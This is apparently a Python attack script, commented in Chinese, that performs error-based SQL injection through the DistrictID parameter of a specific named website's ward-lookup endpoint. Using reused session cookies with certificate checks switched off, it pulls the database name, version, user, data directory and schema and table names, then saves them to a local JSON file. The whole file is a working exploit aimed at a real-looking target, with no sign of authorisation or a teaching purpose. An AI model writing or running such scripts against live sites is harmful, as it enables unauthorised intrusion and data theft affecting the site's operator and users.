#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import re
import urllib3
urllib3.disable_warnings()

class ExtractFromWardEndpoint:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def extract_value(self, query):
        """从端点提取值"""
        endpoint = '/Handle/SearchListWardByDistrictID'
        param = 'DistrictID'
        
        payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
        url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
        
        try:
            r = self.session.get(url, timeout=10)
            
            # 尝试多种提取模式
            patterns = [
                r"XPATH syntax error: '~([^']+)~'",
                r"'~([^']+)~'",
                r"~([^~]+)~",
                r"XPATH.*?([A-Za-z0-9_]+)",
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, r.text, re.IGNORECASE)
                for match in matches:
                    if match and len(match) > 0 and match != 'TEST' and match != 'XPATH':
                        return match
            
            # 如果没找到，返回响应长度（可能有延迟）
            if len(r.text) > 50000:
                return f"响应长度异常: {len(r.text)}"
        except Exception as e:
            return f"错误: {str(e)}"
        
        return None
    
    def extract_all(self):
        """提取所有数据库信息"""
        print("="*60)
        print("从 /Handle/SearchListWardByDistrictID 提取数据库")
        print("="*60)
        
        queries = [
            ('SELECT database()', '数据库名'),
            ('SELECT version()', '版本'),
            ('SELECT user()', '用户'),
            ('SELECT @@version', 'MySQL版本'),
            ('SELECT @@datadir', '数据目录'),
            ('SELECT schema_name FROM information_schema.schemata LIMIT 1', '第一个schema'),
            ('SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1', '第一个表'),
        ]
        
        for query, label in queries:
            print(f"\n[*] 提取 {label}...")
            value = self.extract_value(query)
            if value:
                print(f"    [+] {label}: {value}")
                self.db_info[label] = value
            else:
                print(f"    [-] 未提取到")
        
        # 保存结果
        with open('ward_endpoint_extraction.json', 'w', encoding='utf-8') as f:
            json.dump(self.db_info, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("提取结果")
        print("="*60)
        for k, v in self.db_info.items():
            print(f"{k}: {v}")

if __name__ == "__main__":
    extractor = ExtractFromWardEndpoint()
    extractor.extract_all()